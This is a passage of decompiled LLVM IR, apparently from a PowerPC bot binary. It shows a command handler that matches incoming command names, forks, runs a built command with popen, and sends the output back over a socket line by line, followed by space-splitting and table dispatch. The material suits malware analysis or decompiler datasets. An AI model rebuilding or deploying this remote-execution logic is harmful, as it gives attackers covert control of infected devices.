  br i1 %v3_100114f0, label %dec_label_pc_10011494, label %dec_label_pc_100114f8

dec_label_pc_100114f8:                            ; preds = %dec_label_pc_10011494, %dec_label_pc_1001143c
  store i32 %v5_10011484, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011500.899 to i32), i32* @lr, align 4
  %v1_100114fc = call i32 @pclose(i32 %v5_10011484)
  %v0_10011504 = call i32 @__GI_exit()
  store i32 %v0_10011504, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011508

dec_label_pc_10011508:                            ; preds = %dec_label_pc_10011408, %dec_label_pc_100114f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002dc1c.900 to i32), i32* @r4, align 4
  %v5_10011518 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([8 x i8]* @global_var_1002dc1c.900 to i32), i32 7)
  store i32 %v5_10011518, i32* %r3.global-to-local, align 4
  %v3_10011520 = icmp eq i32 %v5_10011518, 0
  br i1 %v3_10011520, label %dec_label_pc_10011528, label %dec_label_pc_10011608

dec_label_pc_10011528:                            ; preds = %dec_label_pc_10011508
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001152c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001152c, i32* %r3.global-to-local, align 4
  %v3_10011534 = icmp eq i32 %v1_1001152c, 0
  br i1 %v3_10011534, label %dec_label_pc_1001153c, label %dec_label_pc_10011c60

dec_label_pc_1001153c:                            ; preds = %dec_label_pc_10011528
  %v2_1001153c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001153c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506448, i32* @lr, align 4
  %v0_1001154c = call i32 @__GI_memset()
  store i32 %v2_1001153c, i32* @r3, align 4
  store i32 268506484, i32* @lr, align 4
  %v1_10011570 = call i32 @sprintf(i32 %v2_1001153c)
  store i32 %v2_1001153c, i32* %r3.global-to-local, align 4
  store i32 268506504, i32* @lr, align 4
  %v5_10011584 = call i32 @popen(i32 %v2_1001153c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011584, i32* %r3.global-to-local, align 4
  store i32 268506604, i32* @lr, align 4
  %v1_100115e862 = call i32 @feof(i32 %v5_10011584)
  store i32 %v1_100115e862, i32* %r3.global-to-local, align 4
  %v3_100115f065 = icmp eq i32 %v1_100115e862, 0
  br i1 %v3_100115f065, label %dec_label_pc_10011594, label %dec_label_pc_100115f8

dec_label_pc_10011594:                            ; preds = %dec_label_pc_1001153c, %dec_label_pc_10011594
  store i32 %v2_1001153c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506536, i32* @lr, align 4
  %v0_100115a4 = call i32 @__GI_memset()
  store i32 %v2_1001153c, i32* %r3.global-to-local, align 4
  store i32 268506556, i32* @lr, align 4
  %v3_100115b8 = call i32 @fgets(i32 %v2_1001153c, i32 1024, i32 %v5_10011584)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100115d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001153c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506596, i32* @lr, align 4
  %v1_100115e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011584, i32* %r3.global-to-local, align 4
  store i32 268506604, i32* @lr, align 4
  %v1_100115e8 = call i32 @feof(i32 %v5_10011584)
  store i32 %v1_100115e8, i32* %r3.global-to-local, align 4
  %v3_100115f0 = icmp eq i32 %v1_100115e8, 0
  br i1 %v3_100115f0, label %dec_label_pc_10011594, label %dec_label_pc_100115f8

dec_label_pc_100115f8:                            ; preds = %dec_label_pc_10011594, %dec_label_pc_1001153c
  store i32 %v5_10011584, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011600.903 to i32), i32* @lr, align 4
  %v1_100115fc = call i32 @pclose(i32 %v5_10011584)
  %v0_10011604 = call i32 @__GI_exit()
  store i32 %v0_10011604, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011608

dec_label_pc_10011608:                            ; preds = %dec_label_pc_10011508, %dec_label_pc_100115f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002dd10.904 to i32), i32* @r4, align 4
  %v5_10011618 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([8 x i8]* @global_var_1002dd10.904 to i32), i32 6)
  store i32 %v5_10011618, i32* %r3.global-to-local, align 4
  %v3_10011620 = icmp eq i32 %v5_10011618, 0
  br i1 %v3_10011620, label %dec_label_pc_10011628, label %dec_label_pc_10011708

dec_label_pc_10011628:                            ; preds = %dec_label_pc_10011608
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001162c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001162c, i32* %r3.global-to-local, align 4
  %v3_10011634 = icmp eq i32 %v1_1001162c, 0
  br i1 %v3_10011634, label %dec_label_pc_1001163c, label %dec_label_pc_10011c60

dec_label_pc_1001163c:                            ; preds = %dec_label_pc_10011628
  %v2_1001163c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001163c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506704, i32* @lr, align 4
  %v0_1001164c = call i32 @__GI_memset()
  store i32 %v2_1001163c, i32* @r3, align 4
  store i32 268506740, i32* @lr, align 4
  %v1_10011670 = call i32 @sprintf(i32 %v2_1001163c)
  store i32 %v2_1001163c, i32* %r3.global-to-local, align 4
  store i32 268506760, i32* @lr, align 4
  %v5_10011684 = call i32 @popen(i32 %v2_1001163c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011684, i32* %r3.global-to-local, align 4
  store i32 268506860, i32* @lr, align 4
  %v1_100116e858 = call i32 @feof(i32 %v5_10011684)
  store i32 %v1_100116e858, i32* %r3.global-to-local, align 4
  %v3_100116f061 = icmp eq i32 %v1_100116e858, 0
  br i1 %v3_100116f061, label %dec_label_pc_10011694, label %dec_label_pc_100116f8

dec_label_pc_10011694:                            ; preds = %dec_label_pc_1001163c, %dec_label_pc_10011694
  store i32 %v2_1001163c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506792, i32* @lr, align 4
  %v0_100116a4 = call i32 @__GI_memset()
  store i32 %v2_1001163c, i32* %r3.global-to-local, align 4
  store i32 268506812, i32* @lr, align 4
  %v3_100116b8 = call i32 @fgets(i32 %v2_1001163c, i32 1024, i32 %v5_10011684)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100116d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001163c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268506852, i32* @lr, align 4
  %v1_100116e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011684, i32* %r3.global-to-local, align 4
  store i32 268506860, i32* @lr, align 4
  %v1_100116e8 = call i32 @feof(i32 %v5_10011684)
  store i32 %v1_100116e8, i32* %r3.global-to-local, align 4
  %v3_100116f0 = icmp eq i32 %v1_100116e8, 0
  br i1 %v3_100116f0, label %dec_label_pc_10011694, label %dec_label_pc_100116f8

dec_label_pc_100116f8:                            ; preds = %dec_label_pc_10011694, %dec_label_pc_1001163c
  store i32 %v5_10011684, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011700.907 to i32), i32* @lr, align 4
  %v1_100116fc = call i32 @pclose(i32 %v5_10011684)
  %v0_10011704 = call i32 @__GI_exit()
  store i32 %v0_10011704, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011708

dec_label_pc_10011708:                            ; preds = %dec_label_pc_10011608, %dec_label_pc_100116f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002dd8c.908 to i32), i32* @r4, align 4
  %v5_10011718 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([6 x i8]* @global_var_1002dd8c.908 to i32), i32 5)
  store i32 %v5_10011718, i32* %r3.global-to-local, align 4
  %v3_10011720 = icmp eq i32 %v5_10011718, 0
  br i1 %v3_10011720, label %dec_label_pc_10011728, label %dec_label_pc_10011808

dec_label_pc_10011728:                            ; preds = %dec_label_pc_10011708
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001172c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001172c, i32* %r3.global-to-local, align 4
  %v3_10011734 = icmp eq i32 %v1_1001172c, 0
  br i1 %v3_10011734, label %dec_label_pc_1001173c, label %dec_label_pc_10011c60

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_10011728
  %v2_1001173c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001173c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268506960, i32* @lr, align 4
  %v0_1001174c = call i32 @__GI_memset()
  store i32 %v2_1001173c, i32* @r3, align 4
  store i32 268506996, i32* @lr, align 4
  %v1_10011770 = call i32 @sprintf(i32 %v2_1001173c)
  store i32 %v2_1001173c, i32* %r3.global-to-local, align 4
  store i32 268507016, i32* @lr, align 4
  %v5_10011784 = call i32 @popen(i32 %v2_1001173c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011784, i32* %r3.global-to-local, align 4
  store i32 268507116, i32* @lr, align 4
  %v1_100117e854 = call i32 @feof(i32 %v5_10011784)
  store i32 %v1_100117e854, i32* %r3.global-to-local, align 4
  %v3_100117f057 = icmp eq i32 %v1_100117e854, 0
  br i1 %v3_100117f057, label %dec_label_pc_10011794, label %dec_label_pc_100117f8

dec_label_pc_10011794:                            ; preds = %dec_label_pc_1001173c, %dec_label_pc_10011794
  store i32 %v2_1001173c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268507048, i32* @lr, align 4
  %v0_100117a4 = call i32 @__GI_memset()
  store i32 %v2_1001173c, i32* %r3.global-to-local, align 4
  store i32 268507068, i32* @lr, align 4
  %v3_100117b8 = call i32 @fgets(i32 %v2_1001173c, i32 1024, i32 %v5_10011784)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100117d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001173c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268507108, i32* @lr, align 4
  %v1_100117e0 = call i32 @sleep(i32 1)
  store i32 %v5_10011784, i32* %r3.global-to-local, align 4
  store i32 268507116, i32* @lr, align 4
  %v1_100117e8 = call i32 @feof(i32 %v5_10011784)
  store i32 %v1_100117e8, i32* %r3.global-to-local, align 4
  %v3_100117f0 = icmp eq i32 %v1_100117e8, 0
  br i1 %v3_100117f0, label %dec_label_pc_10011794, label %dec_label_pc_100117f8

dec_label_pc_100117f8:                            ; preds = %dec_label_pc_10011794, %dec_label_pc_1001173c
  store i32 %v5_10011784, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011800.911 to i32), i32* @lr, align 4
  %v1_100117fc = call i32 @pclose(i32 %v5_10011784)
  %v0_10011804 = call i32 @__GI_exit()
  store i32 %v0_10011804, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011808

dec_label_pc_10011808:                            ; preds = %dec_label_pc_10011708, %dec_label_pc_100117f8
  store i32 %v1_10010e90, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002df2c.912 to i32), i32* @r4, align 4
  %v5_10011818 = call i32 @__GI_strncmp(i8* %v5_10010e94, i32 ptrtoint ([6 x i8]* @global_var_1002df2c.912 to i32), i32 5)
  store i32 %v5_10011818, i32* %r3.global-to-local, align 4
  %v3_10011820 = icmp eq i32 %v5_10011818, 0
  br i1 %v3_10011820, label %dec_label_pc_10011828, label %dec_label_pc_10011908

dec_label_pc_10011828:                            ; preds = %dec_label_pc_10011808
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_1001182c = call i32 @mfork(i32 %arg2)
  store i32 %v1_1001182c, i32* %r3.global-to-local, align 4
  %v3_10011834 = icmp eq i32 %v1_1001182c, 0
  br i1 %v3_10011834, label %dec_label_pc_1001183c, label %dec_label_pc_10011c60

dec_label_pc_1001183c:                            ; preds = %dec_label_pc_10011828
  %v2_1001183c = ptrtoint i32* %stack_var_-1068 to i32
  store i32 %v2_1001183c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268507216, i32* @lr, align 4
  %v0_1001184c = call i32 @__GI_memset()
  store i32 %v2_1001183c, i32* @r3, align 4
  store i32 268507252, i32* @lr, align 4
  %v1_10011870 = call i32 @sprintf(i32 %v2_1001183c)
  store i32 %v2_1001183c, i32* %r3.global-to-local, align 4
  store i32 268507272, i32* @lr, align 4
  %v5_10011884 = call i32 @popen(i32 %v2_1001183c, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v5_10011884, i32* %stack_var_-2200, align 4
  store i32 %v5_10011884, i32* %r3.global-to-local, align 4
  store i32 268507372, i32* @lr, align 4
  %v1_100118e850 = call i32 @feof(i32 %v5_10011884)
  store i32 %v1_100118e850, i32* %r3.global-to-local, align 4
  %v3_100118f053 = icmp eq i32 %v1_100118e850, 0
  br i1 %v3_100118f053, label %dec_label_pc_10011894, label %dec_label_pc_100118f8

dec_label_pc_10011894:                            ; preds = %dec_label_pc_1001183c, %dec_label_pc_10011894
  store i32 %v2_1001183c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268507304, i32* @lr, align 4
  %v0_100118a4 = call i32 @__GI_memset()
  store i32 %v2_1001183c, i32* %r3.global-to-local, align 4
  %v3_100118b4 = load i32, i32* %stack_var_-2200, align 4
  store i32 268507324, i32* @lr, align 4
  %v3_100118b8 = call i32 @fgets(i32 %v2_1001183c, i32 1024, i32 %v3_100118b4)
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v6_100118d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1002d494.877 to i32), i32 %arg2, i32 %v2_1001183c)
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268507364, i32* @lr, align 4
  %v1_100118e0 = call i32 @sleep(i32 1)
  %v3_100118e4 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100118e4, i32* %r3.global-to-local, align 4
  store i32 268507372, i32* @lr, align 4
  %v1_100118e8 = call i32 @feof(i32 %v3_100118e4)
  store i32 %v1_100118e8, i32* %r3.global-to-local, align 4
  %v3_100118f0 = icmp eq i32 %v1_100118e8, 0
  br i1 %v3_100118f0, label %dec_label_pc_10011894, label %dec_label_pc_100118f8

dec_label_pc_100118f8:                            ; preds = %dec_label_pc_10011894, %dec_label_pc_1001183c
  %v3_100118f8 = load i32, i32* %stack_var_-2200, align 4
  store i32 %v3_100118f8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011900.915 to i32), i32* @lr, align 4
  %v1_100118fc = call i32 @pclose(i32 %v3_100118f8)
  %v0_10011904 = call i32 @__GI_exit()
  store i32 %v0_10011904, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011908

dec_label_pc_10011908:                            ; preds = %dec_label_pc_10011808, %dec_label_pc_100118f8
  store i32 %v1_10010e90, i32* @r3, align 4
  %v0_1001190c = call i32 @__GI_strlen()
  store i32 %v0_1001190c, i32* %r3.global-to-local, align 4
  %v2_1001198841 = icmp sgt i32 %v0_1001190c, 0
  br i1 %v2_1001198841, label %dec_label_pc_10011924.lr.ph, label %dec_label_pc_100119d4.preheader

dec_label_pc_10011924.lr.ph:                      ; preds = %dec_label_pc_10011908
  %v2_1001195c = ptrtoint i32* %stack_var_-2200 to i32
  %v2_10011960 = add i32 %v2_1001195c, 108
  br label %dec_label_pc_10011924

dec_label_pc_10011924:                            ; preds = %dec_label_pc_10011924.lr.ph, %dec_label_pc_1001194c
  %storemerge1145 = phi i32 [ 0, %dec_label_pc_10011924.lr.ph ], [ %v1_10011978, %dec_label_pc_1001194c ]
  %stack_var_-2152.044 = phi i8* [ %v5_10010e94, %dec_label_pc_10011924.lr.ph ], [ %v5_10011970, %dec_label_pc_1001194c ]
  %v4_10011924 = ptrtoint i8* %stack_var_-2152.044 to i32
  %v2_10011928 = load i8, i8* %stack_var_-2152.044, align 1
  %v3_10011930 = icmp eq i8 %v2_10011928, 32
  br i1 %v3_10011930, label %dec_label_pc_100119d4.preheader, label %dec_label_pc_10011938

dec_label_pc_10011938:                            ; preds = %dec_label_pc_10011924
  %v2_1001193c = load i8, i8* %stack_var_-2152.044, align 1
  %v3_10011944 = icmp eq i8 %v2_1001193c, 0
  br i1 %v3_10011944, label %dec_label_pc_100119d4.preheader, label %dec_label_pc_1001194c

dec_label_pc_1001194c:                            ; preds = %dec_label_pc_10011938
  %v2_10011954 = load i8, i8* %stack_var_-2152.044, align 1
  %v3_10011964 = add i32 %v2_10011960, %storemerge1145
  %v4_10011964 = inttoptr i32 %v3_10011964 to i8*
  store i8 %v2_10011954, i8* %v4_10011964, align 1
  %v1_1001196c = add i32 %v4_10011924, 1
  %v5_10011970 = inttoptr i32 %v1_1001196c to i8*
  %v1_10011978 = add nuw nsw i32 %storemerge1145, 1
  %v2_10011988 = icmp slt i32 %v1_10011978, %v0_1001190c
  br i1 %v2_10011988, label %dec_label_pc_10011924, label %dec_label_pc_100119d4.preheader

dec_label_pc_100119d4.preheader:                  ; preds = %dec_label_pc_1001194c, %dec_label_pc_10011924, %dec_label_pc_10011938, %dec_label_pc_10011908
  %stack_var_-2152.0.lcssa = phi i8* [ %v5_10010e94, %dec_label_pc_10011908 ], [ %v5_10011970, %dec_label_pc_1001194c ], [ %stack_var_-2152.044, %dec_label_pc_10011924 ], [ %stack_var_-2152.044, %dec_label_pc_10011938 ]
  store i32 0, i32* %r29.global-to-local, align 4
  %v4_100119d8 = ptrtoint i8* %stack_var_-2152.0.lcssa to i32
  store i32 %v4_100119d8, i32* @r3, align 4
  %v0_100119dc33 = call i32 @__GI_strlen()
  store i32 %v0_100119dc33, i32* %r3.global-to-local, align 4
  %v0_100119e434 = load i32, i32* %r29.global-to-local, align 4
  %v2_100119e435 = icmp ult i32 %v0_100119e434, %v0_100119dc33
  br i1 %v2_100119e435, label %dec_label_pc_1001199c, label %dec_label_pc_100119ec

dec_label_pc_1001199c:                            ; preds = %dec_label_pc_100119d4.preheader, %dec_label_pc_100119c8
  %storemerge1239 = phi i32 [ %v1_100119cc, %dec_label_pc_100119c8 ], [ 0, %dec_label_pc_100119d4.preheader ]
  %stack_var_-2156.138 = phi i32 [ %stack_var_-2156.0, %dec_label_pc_100119c8 ], [ 0, %dec_label_pc_100119d4.preheader ]
  %v2_100119a8 = add i32 %storemerge1239, %v4_100119d8
  %v1_100119ac = inttoptr i32 %v2_100119a8 to i8*
  %v2_100119ac = load i8, i8* %v1_100119ac, align 1
  %v3_100119b4 = icmp eq i8 %v2_100119ac, 32
  br i1 %v3_100119b4, label %dec_label_pc_100119bc, label %dec_label_pc_100119c8

dec_label_pc_100119bc:                            ; preds = %dec_label_pc_1001199c
  %v1_100119c0 = add i32 %stack_var_-2156.138, 1
  br label %dec_label_pc_100119c8

dec_label_pc_100119c8:                            ; preds = %dec_label_pc_1001199c, %dec_label_pc_100119bc
  %stack_var_-2156.0 = phi i32 [ %v1_100119c0, %dec_label_pc_100119bc ], [ %stack_var_-2156.138, %dec_label_pc_1001199c ]
  %v1_100119cc = add i32 %storemerge1239, 1
  store i32 %v1_100119cc, i32* %r29.global-to-local, align 4
  store i32 %v4_100119d8, i32* @r3, align 4
  %v0_100119dc = call i32 @__GI_strlen()
  store i32 %v0_100119dc, i32* %r3.global-to-local, align 4
  %v0_100119e4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100119e4 = icmp ult i32 %v0_100119e4, %v0_100119dc
  br i1 %v2_100119e4, label %dec_label_pc_1001199c, label %dec_label_pc_100119ec

dec_label_pc_100119ec:                            ; preds = %dec_label_pc_100119c8, %dec_label_pc_100119d4.preheader
  %stack_var_-2156.1.lcssa = phi i32 [ 0, %dec_label_pc_100119d4.preheader ], [ %stack_var_-2156.0, %dec_label_pc_100119c8 ]
  %v1_100119f0 = add i32 %stack_var_-2156.1.lcssa, 1
  %tmp145 = icmp slt i32 %v1_100119f0, 11
  br i1 %tmp145, label %dec_label_pc_10011a0c, label %dec_label_pc_10011a04

dec_label_pc_10011a04:                            ; preds = %dec_label_pc_100119ec
  br label %dec_label_pc_10011a0c

dec_label_pc_10011a0c:                            ; preds = %dec_label_pc_100119ec, %dec_label_pc_10011a04
  %stack_var_-2156.2 = phi i32 [ %v1_100119f0, %dec_label_pc_100119ec ], [ 10, %dec_label_pc_10011a04 ]
  %v1_10011a18 = mul i32 %stack_var_-2156.2, 4
  %v2_10011a20 = ptrtoint i32* %stack_var_-2200 to i32
  %v2_10011a24 = add i32 %v2_10011a20, 64
  %v1_10011a28 = add i32 %v2_10011a24, %v1_10011a18
  %v2_10011a34 = inttoptr i32 %v1_10011a28 to i32*
  store i32 ptrtoint (i32* @global_var_10029e0c.199 to i32), i32* %v2_10011a34, align 4
  %v2_10011b5827 = load i8, i8* %stack_var_-2152.0.lcssa, align 1
  %v3_10011b6030 = icmp eq i8 %v2_10011b5827, 0
  br i1 %v3_10011b6030, label %dec_label_pc_10011b68, label %dec_label_pc_10011a44.lr.ph

dec_label_pc_10011a44.lr.ph:                      ; preds = %dec_label_pc_10011a0c
  %v2_10011ad4 = add i32 %v2_10011a20, 60
  br label %dec_label_pc_10011a44

dec_label_pc_10011a44:                            ; preds = %dec_label_pc_10011a44.lr.ph, %dec_label_pc_10011ab0
  %v4_10011b5432 = phi i32 [ %v4_100119d8, %dec_label_pc_10011a44.lr.ph ], [ %v2_10011b4c, %dec_label_pc_10011ab0 ]
  %stack_var_-2160.031 = phi i32 [ 1, %dec_label_pc_10011a44.lr.ph ], [ %v1_10011b38, %dec_label_pc_10011ab0 ]
  %v1_10011a48 = add i32 %v4_10011b5432, 1
  %v2_10011a58 = icmp slt i32 %stack_var_-2160.031, %stack_var_-2156.2
  br i1 %v2_10011a58, label %dec_label_pc_10011a78.preheader, label %dec_label_pc_10011b68

dec_label_pc_10011a78.preheader:                  ; preds = %dec_label_pc_10011a44
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10011a48, i32* @r3, align 4
  %v0_10011a8019 = call i32 @__GI_strlen()
  store i32 %v0_10011a8019, i32* %r3.global-to-local, align 4
  %v0_10011a8820 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011a8821 = icmp ult i32 %v0_10011a8820, %v0_10011a8019
  br i1 %v2_10011a8821, label %dec_label_pc_10011a90, label %dec_label_pc_10011ab0

dec_label_pc_10011a6c:                            ; preds = %dec_label_pc_10011a90
  %v1_10011a70 = add i32 %storemerge1424, 1
  store i32 %v1_10011a70, i32* %r29.global-to-local, align 4
  store i32 %v1_10011a48, i32* @r3, align 4
  %v0_10011a80 = call i32 @__GI_strlen()
  store i32 %v0_10011a80, i32* %r3.global-to-local, align 4
  %v0_10011a88 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011a88 = icmp ult i32 %v0_10011a88, %v0_10011a80
  br i1 %v2_10011a88, label %dec_label_pc_10011a90, label %dec_label_pc_10011ab0

dec_label_pc_10011a90:                            ; preds = %dec_label_pc_10011a78.preheader, %dec_label_pc_10011a6c
  %storemerge1424 = phi i32 [ %v1_10011a70, %dec_label_pc_10011a6c ], [ 0, %dec_label_pc_10011a78.preheader ]
  %v2_10011a9c = add i32 %storemerge1424, %v1_10011a48
  %v1_10011aa0 = inttoptr i32 %v2_10011a9c to i8*
  %v2_10011aa0 = load i8, i8* %v1_10011aa0, align 1
  %v3_10011aa8 = icmp eq i8 %v2_10011aa0, 32
  br i1 %v3_10011aa8, label %dec_label_pc_10011ab0, label %dec_label_pc_10011a6c

dec_label_pc_10011ab0:                            ; preds = %dec_label_pc_10011a6c, %dec_label_pc_10011a90, %dec_label_pc_10011a78.preheader
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_10011a78.preheader ], [ %v1_10011a70, %dec_label_pc_10011a6c ], [ %storemerge1424, %dec_label_pc_10011a90 ]
  store i32 %stack_var_-2160.031, i32* @r29, align 4
  %v1_10011ab8 = add i32 %storemerge14.lcssa, 1
  store i32 %v1_10011ab8, i32* @r3, align 4
  store i32 268507844, i32* @lr, align 4
  %v0_10011ac0 = call i32 @malloc()
  store i32 %v0_10011ac0, i32* %r3.global-to-local, align 4
  %v0_10011acc = load i32, i32* @r29, align 4
  %v1_10011acc = mul i32 %v0_10011acc, 4
  %v1_10011ad8 = add i32 %v1_10011acc, %v2_10011ad4
  %v2_10011adc = inttoptr i32 %v1_10011ad8 to i32*
  store i32 %v0_10011ac0, i32* %v2_10011adc, align 4
  %v1_10011ae4 = mul i32 %stack_var_-2160.031, 4
  %v1_10011af0 = add i32 %v1_10011ae4, %v2_10011ad4
  %v1_10011af4 = inttoptr i32 %v1_10011af0 to i32*
  %v2_10011af4 = load i32, i32* %v1_10011af4, align 4
  store i32 %v2_10011af4, i32* %r3.global-to-local, align 4
  store i32 %v1_10011a48, i32* @r4, align 4
  store i32 268507916, i32* @lr, align 4
  %v3_10011b08 = call i32 @strncpy(i32 %v2_10011af4, i32 %v1_10011a48, i32 %storemerge14.lcssa)
  store i32 %v3_10011b08, i32* %r3.global-to-local, align 4
  %v2_10011b20 = load i32, i32* %v1_10011af4, align 4
  %v2_10011b28 = add i32 %v2_10011b20, %storemerge14.lcssa
  %v3_10011b30 = inttoptr i32 %v2_10011b28 to i8*
  store i8 0, i8* %v3_10011b30, align 1
  %v1_10011b38 = add nuw i32 %stack_var_-2160.031, 1
  %v2_10011b4c = add i32 %storemerge14.lcssa, %v1_10011a48
  %v5_10011b50 = inttoptr i32 %v2_10011b4c to i8*
  %v2_10011b58 = load i8, i8* %v5_10011b50, align 1
  %v3_10011b60 = icmp eq i8 %v2_10011b58, 0
  br i1 %v3_10011b60, label %dec_label_pc_10011b68, label %dec_label_pc_10011a44

dec_label_pc_10011b68:                            ; preds = %dec_label_pc_10011ab0, %dec_label_pc_10011a44, %dec_label_pc_10011a0c
  %v2_10011c54 = load i32, i32* bitcast ([4 x i8]** @global_var_1004073c.917 to i32*), align 4
  %v3_10011c58 = icmp eq i32 %v2_10011c54, 0
  br i1 %v3_10011c58, label %dec_label_pc_10011c60, label %dec_label_pc_10011b74

dec_label_pc_10011b74:                            ; preds = %dec_label_pc_10011b68
  store i32 %v2_10011c54, i32* @r3, align 4
  store i32 %v2_10010dd0, i32* @r4, align 4
  %v2_10011b98 = call i32 @__GI_strcasecmp(i32 %v2_10011c54, i32 %v2_10010dd0)
  store i32 %v2_10011b98, i32* %r3.global-to-local, align 4
  %v2_10011bc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_1004073c.917 to i32), i32 4) to i32*), align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_10011bc0)
  %v2_10011c2815 = icmp sgt i32 %stack_var_-2156.2, 1
  br i1 %v2_10011c2815, label %dec_label_pc_10011bf4.lr.ph, label %dec_label_pc_10011c60

dec_label_pc_10011bf4.lr.ph:                      ; preds = %dec_label_pc_10011b74
  %v2_10011c00 = add i32 %v2_10011a20, 60
  br label %dec_label_pc_10011bf4

dec_label_pc_10011bf4:                            ; preds = %dec_label_pc_10011bf4.lr.ph, %dec_label_pc_10011bf4
  %storemerge1318 = phi i32 [ 1, %dec_label_pc_10011bf4.lr.ph ], [ %v1_10011c18, %dec_label_pc_10011bf4 ]
  %v1_10011bf8 = mul i32 %storemerge1318, 4
  %v1_10011c04 = add i32 %v2_10011c00, %v1_10011bf8
  %v1_10011c08 = inttoptr i32 %v1_10011c04 to i32*
  %v2_10011c08 = load i32, i32* %v1_10011c08, align 4
  store i32 %v2_10011c08, i32* @r3, align 4
  store i32 268508180, i32* @lr, align 4
  %v0_10011c10 = call i32 @free()
  store i32 %v0_10011c10, i32* %r3.global-to-local, align 4
  %v1_10011c18 = add nuw nsw i32 %storemerge1318, 1
  %v2_10011c28 = icmp slt i32 %v1_10011c18, %stack_var_-2156.2
  br i1 %v2_10011c28, label %dec_label_pc_10011bf4, label %dec_label_pc_10011c60

